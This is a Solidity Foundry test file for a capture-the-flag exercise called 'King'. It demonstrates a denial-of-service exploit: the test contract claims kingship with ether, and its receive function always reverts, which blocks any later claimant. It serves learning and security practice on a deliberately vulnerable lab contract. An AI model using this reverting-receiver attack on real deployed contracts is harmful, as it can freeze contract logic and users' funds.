// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/9-King.sol";

contract KingTest is Test {
    King public kingCTF;

    function setUp() public {
        kingCTF = new King();
    }

    function testAttack() public {
        // become the new king
        address(kingCTF).call{value: 0.01 ether}("");

        assertEq(kingCTF._king(), address(this));

        // try to become new owner
        vm.startPrank(address(0x02));
        vm.deal(address(0x02), 1 ether);

        // claiming new kignship should revert
        vm.expectRevert();
        address(kingCTF).call{value: 0.01 ether}("");

        // king should not have changed
        assertEq(kingCTF._king(), address(this));
    }

    receive() external payable {
        revert();
    }
}
